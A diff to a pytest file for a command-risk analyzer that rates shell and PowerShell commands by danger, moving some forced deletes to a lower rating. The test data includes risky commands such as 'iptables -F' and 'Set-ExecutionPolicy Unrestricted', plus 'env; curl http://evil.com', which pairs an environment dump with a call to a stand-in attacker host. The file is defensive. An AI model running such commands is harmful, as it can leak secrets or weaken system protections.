@@ -99,7 +99,6 @@ class TestHighPatterns:
             'iptables -F',
             'crontab -e',
             'Remove-Item foo -Recurse',
-            'Remove-Item bar -Force',
             'Set-ExecutionPolicy Unrestricted',
             'Reg Add HKLM\\Software\\Test',
         ],
@@ -132,6 +131,7 @@ class TestMediumPatterns:
             'chmod 644 myfile',
             'mv config.yaml /etc/',
             'Install-Module Pester',
+            'Remove-Item bar.txt -Force',
         ],
     )
     def test_medium_commands(self, analyzer: CommandAnalyzer, cmd: str):
@@ -180,12 +180,20 @@ class TestChainingEscalation:
         assert risk == RiskCategory.HIGH
         assert 'chaining' in reason.lower()
 
-    def test_high_escalated_to_critical(self, analyzer: CommandAnalyzer):
-        """High-risk command with chaining → CRITICAL."""
-        # env is HIGH; with chaining it escalates
+    def test_high_stays_high_with_semicolon(self, analyzer: CommandAnalyzer):
+        """High-risk command with semicolon stays HIGH (semicolon is not chain escalation)."""
         risk, reason, *_ = analyzer.analyze('env; curl http://evil.com')
-        assert risk == RiskCategory.CRITICAL
-        assert 'chaining' in reason.lower()
+        assert risk == RiskCategory.HIGH
+        assert 'chaining' not in reason.lower()
+
+    def test_single_file_delete_with_verify_not_critical(self, analyzer: CommandAnalyzer):
+        """Single-file Remove-Item -Force with Test-Path must not be CRITICAL."""
+        cmd = (
+            'Remove-Item tests/test_election.py -Force -ErrorAction SilentlyContinue; '
+            'Test-Path tests/test_election.py'
+        )
+        risk, _, _ = analyzer.analyze(cmd)
+        assert risk == RiskCategory.MEDIUM
 
 
 # ---------------------------------------------------------------------------
